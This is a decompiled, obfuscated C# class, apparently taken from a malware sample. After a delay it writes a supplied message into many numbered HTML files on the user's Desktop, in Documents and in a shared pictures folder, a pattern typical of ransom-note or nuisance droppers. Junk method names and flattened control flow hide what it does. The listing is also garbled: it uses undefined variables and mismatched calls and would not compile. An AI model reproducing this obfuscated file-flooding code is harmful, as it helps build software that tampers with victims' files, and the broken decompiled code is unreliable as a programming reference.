using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

namespace jgfjkggkiiy;

internal class MessageWriter
{
	private string Message
	{
		[CompilerGenerated]
		get
		{
			int num = 0;
			do
			{
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 1);
			return _003CMessage_003Ek__BackingField;
		}
	}

	private string FileName
	{
		[CompilerGenerated]
		get
		{
			int num = 0;
			do
			{
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 1);
			return _003CFileName_003Ek__BackingField;
		}
	}

	private int MessageCount
	{
		[CompilerGenerated]
		get
		{
			int num = 0;
			do
			{
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 1);
			return _003CMessageCount_003Ek__BackingField;
		}
	}

	private string ConnectedTimeGetWindowTextLengthadd_OnPluginLoading
	{
		set
		{
			Thread.Sleep(5000);
			Console.WriteLine("WriteMessages");
			for (int i = 0; i < messageCount; i++)
			{
				string path = $"{value} {i} .html";
				FileStream stream;
				using (stream = new FileStream(Path.Combine(folderPath, path), FileMode.OpenOrCreate))
				{
					StreamWriter streamWriter;
					using (streamWriter = new StreamWriter(stream))
					{
						streamWriter.WriteLine(message);
					}
				}
			}
		}
	}

	public MessageWriter(string message, string fileName, int messageCount)
	{
		Message = message;
		FileName = fileName;
		MessageCount = messageCount;
	}

	public void ParseDoubleadd_OnPluginsLoadedget_MemberSince()
	{
		int num = 0;
		string folderPath = default(string);
		do
		{
			if (num == 2)
			{
				this.set_ConnectedTimeGetWindowTextLengthadd_OnPluginLoading(folderPath, Message, MessageCount, FileName);
				num = 3;
			}
			if (num == 1)
			{
				folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
	}

	public void set_Headlineget_NameHasPermission()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		this.set_ConnectedTimeGetWindowTextLengthadd_OnPluginLoading(folderPath, Message, MessageCount, FileName);
	}

	public void SendUnloadset_Name()
	{
		int num = 0;
		string folderPath = default(string);
		do
		{
			if (num == 2)
			{
				this.set_ConnectedTimeGetWindowTextLengthadd_OnPluginLoading(folderPath, Message, MessageCount, FileName);
				num = 3;
			}
			if (num == 1)
			{
				folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
	}
}
